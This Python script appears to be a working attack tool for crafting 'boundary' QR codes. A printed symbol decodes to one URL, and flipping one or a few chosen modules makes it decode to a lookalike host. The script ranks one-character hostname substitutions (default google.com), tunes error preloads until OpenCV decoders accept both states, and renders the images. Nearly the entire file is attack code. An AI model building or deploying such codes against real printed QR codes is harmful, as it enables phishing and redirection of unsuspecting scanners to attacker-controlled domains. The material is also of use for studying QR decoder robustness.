#!/usr/bin/env python3
"""Boundary QR codes: flip the lightest allowed symbols, change the host.

A stock QR for URL A and a stock QR for URL B differ, in every Reed-Solomon
block the edit touches, by at least d_min = n_ec + 1 symbols. A one-module
edit of the stock symbol cannot cross that distance.

The attack prints a third symbol. In each block, preload t = floor(n_ec/2)
of the differing symbols so the print is still inside A's decode radius, and
leave the lightest (d - 2t) allowed symbols for the later edit. `polarity`
restricts that edit to darken (0->1, add ink), lighten (1->0, remove ink),
or either. rank_conflicts returns the n cheapest same-length host edits.

On a minimum-weight block with even n_ec the edit is one symbol, often one
module, and that module can sit on a hostname character. Mask is fixed per
plan: it does not change how many bits differ, but it does change module
coordinates and the printed color, so it changes polarity.
"""
from __future__ import annotations

import argparse
from dataclasses import dataclass, field

from segno import consts
from segno.encoder import (
    Buffer,
    add_alignment_patterns,
    add_codewords,
    add_finder_patterns,
    add_format_info,
    add_version_info,
    calc_matrix_size,
    find_and_apply_best_mask,
    make_blocks,
    make_matrix,
    prepare_data,
    version_range,
    write_pad_codewords,
    write_padding_bits,
    write_segment,
    write_terminator,
)

LEVELS = {
    "L": consts.ERROR_LEVEL_L,
    "M": consts.ERROR_LEVEL_M,
    "Q": consts.ERROR_LEVEL_Q,
    "H": consts.ERROR_LEVEL_H,
}
# Syndromes held back for detection, ISO/IEC 18004 clause 7.5.1.
ISO_P = {(1, "L"): 3, (1, "M"): 2, (1, "Q"): 1, (1, "H"): 1, (2, "L"): 2, (3, "L"): 1}
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789-"


def popcount(x: int) -> int:
    return bin(x).count("1")


def remainder_bits(version: int) -> int:
    if version in (2, 3, 4, 5, 6):
        return 7
    if version in (14, 15, 16, 17, 18, 19, 20, 28, 29, 30, 31, 32, 33, 34):
        return 3
    if version in (21, 22, 23, 24, 25, 26, 27):
        return 4
    return 0


def data_codewords(url: str, version: int, level: str) -> list[int]:
    """Byte-mode data codewords, including terminator and pad codewords."""
    err = LEVELS[level]
    buff = Buffer()
    prepared = prepare_data(url, mode=consts.MODE_BYTE, encoding="iso-8859-1")
    ver_range = version_range(version)
    for segment in prepared.segments:
        write_segment(buff, segment, None, ver_range, False)
    capacity = consts.SYMBOL_CAPACITY[version][err]
    write_terminator(buff, capacity, None, len(buff))
    write_padding_bits(buff, version, len(buff))
    write_pad_codewords(buff, version, capacity, len(buff))
    words = list(buff.toints())
    expected = capacity // 8
    if len(words) == expected + 1 and words[-1] == 0:
        words = words[:-1]
    if len(words) != expected:
        raise ValueError(f"{url!r} does not fit version {version}-{level} ({len(words)} != {expected})")
    return words


def protect(words: list[int], version: int, level: str) -> list[dict]:
    """RS blocks. Each block is an independent codeword: data || parity."""
    err = LEVELS[level]
    buff = Buffer()
    for w in words:
        buff.append_bits(w, 8)
    data_blocks, parity_blocks = make_blocks(consts.ECC[version][err], buff)
    metas = []
    for group in consts.ECC[version][err]:
        nsym = group.num_total - group.num_data
        for _ in range(group.num_blocks):
            metas.append({"nsym": nsym, "num_data": group.num_data})
    if len(metas) != len(data_blocks):
        raise RuntimeError("block count mismatch")
    out = []
    for meta, data, parity in zip(metas, data_blocks, parity_blocks):
        out.append({
            "data": list(data),
            "parity": list(parity),
            "nsym": meta["nsym"],
            "num_data": meta["num_data"],
        })
    return out


def radius(nsym: int, version: int, level: str, iso_conservative: bool) -> int:
    if iso_conservative:
        return (nsym - ISO_P.get((version, level), 0)) // 2
    return nsym // 2


def host_span(url: str) -> tuple[int, int]:
    rest = url.split("://", 1)[-1]
    host = rest.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
    if "@" in host:
        host = host.rsplit("@", 1)[1]
    if host.count(":") == 1 and host.rsplit(":", 1)[1].isdigit():
        host = host.rsplit(":", 1)[0]
    start = url.index(host)
    return start, start + len(host)


def host_data_indexes(url: str, version: int) -> set[int]:
    """Data-codeword indexes whose bits overlap the hostname. Versions 1-9.

    The byte-mode header is 4 mode bits + 8 count bits, so the payload starts
    at bit 12 and every character straddles two data codewords.
    """
    if version >= 10:
        raise NotImplementedError("character-count indicator is 16 bits from version 10")
    start, end = host_span(url)
    bit0 = 12 + start * 8
    bit1 = 12 + end * 8
    return {b // 8 for b in range(bit0, bit1)}


def interleave(blocks: list[dict]) -> list[int]:
    """ISO 7.6: data codewords round-robin, then parity codewords round-robin."""
    words = []
    max_data = max(len(b["data"]) for b in blocks)
    for i in range(max_data):
        for b in blocks:
            if i < len(b["data"]):
                words.append(b["data"][i])
    max_ec = max(b["nsym"] for b in blocks)
    for i in range(max_ec):
        for b in blocks:
            if i < b["nsym"]:
                words.append(b["parity"][i])
    return words


def stream_index_of(blocks: list[dict]) -> dict[tuple[int, int], int]:
    """(block, index in data||parity) -> codeword index in the placed bitstream."""
    mapping = {}
    k = 0
    max_data = max(len(b["data"]) for b in blocks)
    for i in range(max_data):
        for bi, b in enumerate(blocks):
            if i < len(b["data"]):
                mapping[(bi, i)] = k
                k += 1
    max_ec = max(b["nsym"] for b in blocks)
    for i in range(max_ec):
        for bi, b in enumerate(blocks):
            if i < b["nsym"]:
                mapping[(bi, len(b["data"]) + i)] = k
                k += 1
    return mapping


@dataclass
class SymbolDiff:
    block: int
    index: int
    xor: int
    bits: int
    in_host: bool
    stream_index: int


@dataclass
class Plan:
    url_from: str
    url_to: str
    version: int
    level: str
    mask: int
    symbol_distance: int
    bit_distance: int
    radius: int
    user_symbols: list[SymbolDiff]
    pre_symbols: list[SymbolDiff]
    user_modules: int
    user_in_host: bool
    minimum_weight: bool
    blocks: int
    polarity: str = "any"
    # (row, col, "darken"|"lighten") for every module the user must flip.
    # darken: the printed module is light (0) and the edit turns it dark (1).
    # lighten: the printed module is dark (1) and the edit turns it light (0).
    user_directions: list[tuple[int, int, str]] = field(default_factory=list)


POLARITIES = ("any", "darken", "lighten")
_PLACE_CACHE: dict[int, dict[int, tuple[int, int]]] = {}


def differences(url_from: str, url_to: str, version: int, level: str) -> tuple[list[dict], list[dict], list[list[SymbolDiff]]]:
    w1 = data_codewords(url_from, version, level)
    w2 = data_codewords(url_to, version, level)
    b1 = protect(w1, version, level)
    b2 = protect(w2, version, level)
    if len(b1) != len(b2):
        raise RuntimeError("block structures differ")
    host_idx = host_data_indexes(url_from, version) if version < 10 else set()
    stream = stream_index_of(b1)
    per_block: list[list[SymbolDiff]] = []
    data_base = 0
    for bi, (x, y) in enumerate(zip(b1, b2)):
        diffs = []
        cw1 = x["data"] + x["parity"]
        cw2 = y["data"] + y["parity"]
        for i, (a, c) in enumerate(zip(cw1, cw2)):
            if a == c:
                continue
            in_host = False
            if i < x["num_data"]:
                in_host = (data_base + i) in host_idx
            diffs.append(SymbolDiff(bi, i, a ^ c, popcount(a ^ c), in_host, stream[(bi, i)]))
        per_block.append(diffs)
        data_base += x["num_data"]
    return b1, b2, per_block


def _choose_user(diffs: list[SymbolDiff], user_n: int, require_host_module: bool) -> list[SymbolDiff]:
    """Lightest `user_n` symbols. Host-constrained plans spend the first slot on the lightest host symbol."""
    if len(diffs) < user_n:
        raise ValueError(f"need {user_n} user symbols, have {len(diffs)}")
    light = sorted(diffs, key=lambda s: (s.bits, 0 if s.in_host else 1, s.index))
    if require_host_module and any(s.in_host for s in diffs):
        host_sorted = sorted((s for s in diffs if s.in_host), key=lambda s: (s.bits, s.index))
        user = [host_sorted[0]]
        rest = [s for s in light if not (s.block == user[0].block and s.index == user[0].index)]
        user.extend(rest[: user_n - 1])
        return user
    return light[:user_n]


def _symbol_directions(symbol: SymbolDiff, matrix: list[list[int]], places: dict[int, tuple[int, int]]) -> list[tuple[int, int, str]]:
    base = symbol.stream_index * 8
    out = []
    for b in range(8):
        if not ((symbol.xor >> (7 - b)) & 1):
            continue
        r, c = places[base + b]
        # 0 is light. Flipping a light module darkens it; flipping a dark one lightens it.
        out.append((r, c, "darken" if matrix[r][c] == 0 else "lighten"))
    return out


def _polarity_ok(directions: list[tuple[int, int, str]], polarity: str) -> bool:
    if polarity == "any":
        return True
    return bool(directions) and all(d == polarity for _r, _c, d in directions)


def plan_attack(
    url_from: str,
    url_to: str,
    version: int = 2,
    level: str = "M",
    mask: int = 0,
    iso_conservative: bool = False,
    require_host_module: bool = False,
    polarity: str = "any",
    clean: list[list[int]] | None = None,
    places: dict[int, tuple[int, int]] | None = None,
) -> Plan:
    """Per block: preload t differing symbols, leave the lightest allowed d-2t as the edit.

    `polarity` restricts the user edit:
      any      flip either color
      darken   every user module is light on the print and turns dark (0 -> 1, add ink)
      lighten  every user module is dark on the print and turns light (1 -> 0, remove ink)

    A symbol is allowed only when every bit that differs is the requested
    direction. Partial flips inside a symbol match neither codeword. P is an
    arbitrary t-subset of D\\U; this takes the lowest indexes. The user
    coordinates do not depend on which subset that is.
    """
    if polarity not in POLARITIES:
        raise ValueError(f"polarity must be one of {POLARITIES}")
    b1, _b2, per_block = differences(url_from, url_to, version, level)
    if clean is None:
        clean = render(b1, version, level, mask)
    if places is None:
        places = placement_map(version)
    user: list[SymbolDiff] = []
    pre: list[SymbolDiff] = []
    radii = []
    for block, diffs in zip(b1, per_block):
        if not diffs:
            continue
        t = radius(block["nsym"], version, level, iso_conservative)
        radii.append(t)
        d = len(diffs)
        user_n = d - 2 * t
        if user_n < 1:
            raise ValueError(
                f"block distance {d} is inside radius {t}; this pair is not a boundary attack"
            )
        if user_n + t > d:
            raise ValueError(f"block distance {d} cannot fund {user_n} user symbols and {t} preload symbols")
        allowed = [
            s for s in diffs
            if _polarity_ok(_symbol_directions(s, clean, places), polarity)
        ]
        if len(allowed) < user_n:
            raise ValueError(f"no {user_n}-symbol {polarity} edit in block {diffs[0].block}")
        chosen = _choose_user(allowed, user_n, require_host_module)
        chosen_ids = {(s.block, s.index) for s in chosen}
        pre.extend([s for s in diffs if (s.block, s.index) not in chosen_ids][:t])
        user.extend(chosen)
    if not user:
        raise ValueError("URLs encode to the same codeword")
    if require_host_module and not any(s.in_host for s in user):
        raise ValueError("no differing symbol falls in the hostname")
    directions: list[tuple[int, int, str]] = []
    for sym in user:
        directions.extend(_symbol_directions(sym, clean, places))
    if polarity != "any" and any(d != polarity for _r, _c, d in directions):
        raise RuntimeError("polarity filter leaked a module")
    return Plan(
        url_from=url_from,
        url_to=url_to,
        version=version,
        level=level,
        mask=mask,
        symbol_distance=sum(len(d) for d in per_block),
        bit_distance=sum(s.bits for d in per_block for s in d),
        radius=max(radii) if radii else 0,
        user_symbols=user,
        pre_symbols=pre,
        user_modules=sum(s.bits for s in user),
        user_in_host=any(s.in_host for s in user),
        minimum_weight=all(len(d) in (0, b["nsym"] + 1) for b, d in zip(b1, per_block)),
        blocks=len(b1),
        polarity=polarity,
        user_directions=directions,
    )


def placement_map(version: int) -> dict[int, tuple[int, int]]:
    """Bit index in the final bitstream (codewords, then remainder) -> (row, col)."""
    cached = _PLACE_CACHE.get(version)
    if cached is not None:
        return cached
    width = calc_matrix_size(version)
    matrix = make_matrix(width, width)
    add_finder_patterns(matrix, width, width)
    add_alignment_patterns(matrix, width, width)
    pos = {}
    idx = 0
    for right in range(width - 1, 0, -2):
        if version >= 1 and right <= 6:
            right -= 1
        for vertical in range(width):
            for z in range(2):
                j = right - z
                upwards = (right & 2) == 0
                if version >= 1:
                    upwards ^= j < 6
                i = (width - 1 - vertical) if upwards else vertical
                if matrix[i][j] == 0x2:
                    pos[idx] = (i, j)
                    idx += 1
    _PLACE_CACHE[version] = pos
    return pos


def symbol_modules(version: int, symbol: SymbolDiff, places: dict[int, tuple[int, int]]) -> list[tuple[int, int]]:
    coords = []
    base = symbol.stream_index * 8
    for b in range(8):
        if (symbol.xor >> (7 - b)) & 1:
            coords.append(places[base + b])
    return coords


def render(blocks: list[dict], version: int, level: str, mask: int) -> list[list[int]]:
    bits = Buffer()
    for w in interleave(blocks):
        bits.append_bits(w, 8)
    bits.extend([0] * remainder_bits(version))
    width = calc_matrix_size(version)
    matrix = make_matrix(width, width)
    add_finder_patterns(matrix, width, width)
    add_alignment_patterns(matrix, width, width)
    add_codewords(matrix, bits.getbits(), version)
    _mask, matrix = find_and_apply_best_mask(matrix, width, width, mask)
    add_format_info(matrix, version, LEVELS[level], mask)
    add_version_info(matrix, version)
    return [[1 if c == 1 else 0 for c in row] for row in matrix]


def apply_symbols(matrix: list[list[int]], version: int, symbols: list[SymbolDiff]) -> list[list[int]]:
    places = placement_map(version)
    out = [row[:] for row in matrix]
    for sym in symbols:
        for r, c in symbol_modules(version, sym, places):
            out[r][c] ^= 1
    return out


def matrices(plan: Plan) -> dict[str, list[list[int]]]:
    blocks = protect(data_codewords(plan.url_from, plan.version, plan.level), plan.version, plan.level)
    clean = render(blocks, plan.version, plan.level, plan.mask)
    intermediate = apply_symbols(clean, plan.version, plan.pre_symbols)
    switched = apply_symbols(intermediate, plan.version, plan.user_symbols)
    return {"clean": clean, "intermediate": intermediate, "switched": switched}


def user_coordinates(plan: Plan) -> list[tuple[int, int]]:
    places = placement_map(plan.version)
    coords = []
    for sym in plan.user_symbols:
        coords.extend(symbol_modules(plan.version, sym, places))
    return coords


def search_preload(plan: Plan, decode, attempts: int = 40, seed: int = 0) -> Plan:
    """Keep the same user symbols and try other preload sets until `decode` accepts.

    Algebra does not care which t-subset is preloaded. Some detectors reject a
    particular pattern at the edge of their radius and accept another. The
    user-module coordinates do not move.
    """
    import random
    from collections import Counter

    def ok(candidate: Plan) -> bool:
        mats = matrices(candidate)
        return decode(mats["intermediate"]) == candidate.url_from and decode(mats["switched"]) == candidate.url_to

    if ok(plan):
        return plan
    counts = Counter(s.block for s in plan.pre_symbols)
    _b1, _b2, per_block = differences(plan.url_from, plan.url_to, plan.version, plan.level)
    user_ids = {(s.block, s.index) for s in plan.user_symbols}
    rng = random.Random(seed)
    for _ in range(attempts):
        pre: list[SymbolDiff] = []
        for bi, diffs in enumerate(per_block):
            t = counts.get(bi, 0)
            if t == 0:
                continue
            pool = [s for s in diffs if (s.block, s.index) not in user_ids]
            rng.shuffle(pool)
            pre.extend(pool[:t])
        trial = Plan(
            url_from=plan.url_from, url_to=plan.url_to, version=plan.version, level=plan.level,
            mask=plan.mask, symbol_distance=plan.symbol_distance, bit_distance=plan.bit_distance,
            radius=plan.radius, user_symbols=plan.user_symbols, pre_symbols=pre,
            user_modules=plan.user_modules, user_in_host=plan.user_in_host,
            minimum_weight=plan.minimum_weight, blocks=plan.blocks,
            polarity=plan.polarity, user_directions=plan.user_directions,
        )
        if ok(trial):
            return trial
    raise RuntimeError("decoder rejected every preload that was tried")


def user_bit_characters(plan: Plan) -> list[int | None]:
    """Payload character index of each user module, or None if the bit is header or parity.

    Data-codeword index g holds bitstream bits 8g..8g+7. Payload character k
    occupies bits 12+8k .. 12+8k+7, so a module of a 'host codeword' is not
    always a bit of a host character: the header and the neighbouring character
    share those codewords.
    """
    blocks = protect(data_codewords(plan.url_from, plan.version, plan.level), plan.version, plan.level)
    stream = stream_index_of(blocks)
    inv = {v: k for k, v in stream.items()}
    data_base = []
    base = 0
    for b in blocks:
        data_base.append(base)
        base += b["num_data"]
    owners = []
    for sym in plan.user_symbols:
        bi, index = inv[sym.stream_index]
        for bit in range(8):
            if not ((sym.xor >> (7 - bit)) & 1):
                continue
            if index >= blocks[bi]["num_data"]:
                owners.append(None)
                continue
            abs_bit = (data_base[bi] + index) * 8 + bit
            if abs_bit < 12:
                owners.append(None)
                continue
            owners.append((abs_bit - 12) // 8)
    return owners


def _plan_key(plan: Plan) -> tuple:
    return (
        plan.user_modules,
        0 if plan.user_in_host else 1,
        0 if plan.minimum_weight else 1,
        plan.bit_distance,
        plan.mask,
        plan.url_to,
    )


def rank_conflicts(
    url: str,
    version: int = 2,
    level: str = "M",
    mask: int | None = 0,
    polarity: str = "any",
    n: int = 10,
    require_host_module: bool = True,
    iso_conservative: bool = False,
    alphabet: str = ALPHABET,
) -> list[Plan]:
    """Top-n same-length one-character host edits, fewest user modules first.

    mask=None searches masks 0..7. Polarity is a property of the printed
    color, so a different mask can turn an add-ink edit into a remove-ink
    edit without changing the module count of an unconstrained plan.
    One plan is kept per target URL: the one with the best key.
    """
    if polarity not in POLARITIES:
        raise ValueError(f"polarity must be one of {POLARITIES}")
    masks = list(range(8)) if mask is None else [mask]
    start, end = host_span(url)
    host = url[start:end]
    best: dict[str, Plan] = {}
    places = placement_map(version)
    for m in masks:
        try:
            clean = render(protect(data_codewords(url, version, level), version, level), version, level, m)
        except ValueError:
            return []
        for i, ch in enumerate(host):
            for rep in alphabet:
                if rep == ch:
                    continue
                candidate = url[: start + i] + rep + url[start + i + 1 :]
                try:
                    plan = plan_attack(
                        url, candidate, version, level, m,
                        iso_conservative=iso_conservative,
                        require_host_module=require_host_module,
                        polarity=polarity,
                        clean=clean,
                        places=places,
                    )
                except (ValueError, NotImplementedError):
                    continue
                prev = best.get(plan.url_to)
                if prev is None or _plan_key(plan) < _plan_key(prev):
                    best[plan.url_to] = plan
    ordered = sorted(best.values(), key=_plan_key)
    return ordered[:n]


def best_single_char(
    url: str,
    version: int = 2,
    level: str = "M",
    mask: int = 0,
    require_host_module: bool = True,
    iso_conservative: bool = False,
    polarity: str = "any",
) -> Plan | None:
    ranked = rank_conflicts(
        url, version, level, mask, polarity, n=1,
        require_host_module=require_host_module,
        iso_conservative=iso_conservative,
    )
    return ranked[0] if ranked else None


def save_png(matrix: list[list[int]], path: str, scale: int = 12, border: int = 4, mark: list[tuple[int, int]] | None = None) -> None:
    from PIL import Image, ImageDraw
    n = len(matrix)
    img = Image.new("RGB", ((n + 2 * border) * scale, (n + 2 * border) * scale), "white")
    draw = ImageDraw.Draw(img)
    marks = set(mark or [])
    for y, row in enumerate(matrix):
        for x, val in enumerate(row):
            if not val and (y, x) not in marks:
                continue
            box = [
                ((x + border) * scale, (y + border) * scale),
                ((x + border + 1) * scale - 1, (y + border + 1) * scale - 1),
            ]
            color = (220, 40, 40) if (y, x) in marks else "black"
            draw.rectangle(box, fill=color)
    img.save(path)


def decode_matrix(matrix: list[list[int]], scale: int = 8, border: int = 4) -> str | None:
    """Decode a module matrix. Prefer OpenCV's Aruco QR detector; it accepts
    some maximum-radius patterns that QRCodeDetector rejects even though the
    Reed-Solomon codeword is valid. """
    import cv2
    import numpy as np
    n = len(matrix)
    img = np.full(((n + 2 * border) * scale,) * 2, 255, np.uint8)
    for y, row in enumerate(matrix):
        for x, val in enumerate(row):
            if val:
                py, px = (y + border) * scale, (x + border) * scale
                img[py:py + scale, px:px + scale] = 0
    detectors = []
    if hasattr(cv2, "QRCodeDetectorAruco"):
        detectors.append(cv2.QRCodeDetectorAruco())
    detectors.append(cv2.QRCodeDetector())
    for det in detectors:
        data, _, _ = det.detectAndDecode(img)
        if data:
            return data
    return None


def _format_plan(plan: Plan) -> str:
    coords = user_coordinates(plan)
    chars = user_bit_characters(plan)
    lines = [
        f"{plan.url_from} -> {plan.url_to}",
        f"version {plan.version}-{plan.level} mask {plan.mask} blocks {plan.blocks}",
        f"symbol distance {plan.symbol_distance}  bit distance {plan.bit_distance}  radius {plan.radius}",
        f"minimum weight: {plan.minimum_weight}",
        f"user symbols: {[(s.block, s.index, s.bits, s.in_host) for s in plan.user_symbols]}",
        f"user modules ({plan.user_modules}): {coords}",
        f"directions ({plan.polarity}): {plan.user_directions}",
        f"user-bit payload chars: {chars}",
        f"pre-flipped symbols: {len(plan.pre_symbols)}",
    ]
    return "\n".join(lines)


def _print_check(plan: Plan) -> None:
    mats = matrices(plan)
    only_user = apply_symbols(mats["clean"], plan.version, plan.user_symbols)
    boundary = mats["intermediate"]
    switched = mats["switched"]
    print("clean:            ", decode_matrix(mats["clean"]))
    print("boundary:         ", decode_matrix(boundary))
    print("after user flip:  ", decode_matrix(switched))
    print("stock + user dot: ", decode_matrix(only_user))
    for r, c, direction in plan.user_directions:
        before = boundary[r][c]
        after = switched[r][c]
        print(f"  module ({r},{c}) {before}->{after} {direction}")


def _print_rank(plans: list[Plan]) -> None:
    print(f"{'n':>3} {'mods':>4} {'mask':>4} {'dir':<16} {'target'}")
    for i, plan in enumerate(plans, 1):
        dirs = ",".join(d for _r, _c, d in plan.user_directions)
        coords = " ".join(f"({r},{c})" for r, c, _d in plan.user_directions)
        print(f"{i:>3} {plan.user_modules:>4} {plan.mask:>4} {dirs:<16} {plan.url_to}  {coords}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Rank boundary-QR host retargets by user modules")
    parser.add_argument("url", nargs="?", default="https://google.com")
    parser.add_argument("--to", default=None, help="explicit target URL; otherwise rank one-character host edits")
    parser.add_argument("--version", type=int, default=2)
    parser.add_argument("--level", default="M", choices=list(LEVELS))
    parser.add_argument("--mask", default="0", help="0-7, or 'all'")
    parser.add_argument("--polarity", default="any", choices=list(POLARITIES),
                        help="any | darken (0->1, add ink) | lighten (1->0, remove ink)")
    parser.add_argument("--top", type=int, default=1, help="how many conflicts to print, fewest modules first")
    parser.add_argument("--iso", action="store_true", help="use the ISO detection radius instead of floor(n_ec/2)")
    parser.add_argument("--allow-parity", action="store_true",
                        help="allow the user module to sit outside the hostname")
    parser.add_argument("--check", action="store_true", help="decode clean, boundary, switched, and clean-plus-user-dot")
    parser.add_argument("--png-dir", default=None)
    args = parser.parse_args()
    mask = None if args.mask == "all" else int(args.mask)
    require_host = not args.allow_parity
    if args.to:
        if mask is None:
            raise SystemExit("--to requires a single --mask")
        plans = [plan_attack(
            args.url, args.to, args.version, args.level, mask,
            iso_conservative=args.iso, require_host_module=require_host, polarity=args.polarity,
        )]
    else:
        plans = rank_conflicts(
            args.url, args.version, args.level, mask, args.polarity, n=args.top,
            require_host_module=require_host, iso_conservative=args.iso,
        )
        if not plans:
            raise SystemExit("no single-character plan for this polarity")
    if len(plans) > 1:
        _print_rank(plans)
        print()
    print(_format_plan(plans[0]))
    if args.check or args.png_dir:
        if args.check:
            for plan in plans:
                if len(plans) > 1:
                    print(f"-- {plan.url_to}")
                _print_check(plan)
        if args.png_dir:
            import os
            os.makedirs(args.png_dir, exist_ok=True)
            for i, plan in enumerate(plans, 1):
                mats = matrices(plan)
                coords = user_coordinates(plan)
                prefix = f"{args.png_dir}/{i:02d}" if len(plans) > 1 else args.png_dir
                if len(plans) > 1:
                    os.makedirs(prefix, exist_ok=True)
                save_png(mats["clean"], f"{prefix}/clean.png")
                save_png(mats["intermediate"], f"{prefix}/intermediate.png", mark=coords)
                save_png(mats["switched"], f"{prefix}/switched.png", mark=coords)
            print(f"wrote {args.png_dir}")


if __name__ == "__main__":
    main()
